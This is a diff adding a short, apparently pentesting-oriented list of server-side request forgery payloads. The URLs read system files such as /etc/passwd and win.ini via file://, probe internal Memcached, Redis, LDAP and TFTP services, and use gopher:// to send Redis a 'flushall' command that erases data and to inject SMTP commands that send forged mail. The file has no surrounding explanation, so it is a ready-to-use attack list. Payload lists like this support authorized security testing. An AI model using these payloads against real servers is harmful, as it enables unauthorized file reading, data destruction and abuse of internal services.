@@ -1,0 +1,18 @@
+# SSRF Protocol-Based Payloads
+
+# File Access
+file:///etc/passwd
+file:///C:/Windows/win.ini
+file://\\127.0.0.1\c$\boot.ini
+
+# Service Discovery / Interaction
+dict://127.0.0.1:11211/stat
+dict://127.0.0.1:6379/INFO
+
+# Gopher (Redis/SMTP Exploitation)
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0aquit%0d%0a
+gopher://127.0.0.1:25/_MAIL%20FROM:admin@localhost%0d%0aRCPT%20TO:victim@localhost%0d%0aDATA%0d%0aSubject:SSRF%0d%0aTest%0d%0a.%0d%0aQUIT%0d%0a
+
+# LDAP / TFTP
+ldap://localhost:389/%0astats%0aquit
+tftp://127.0.0.1:69/config
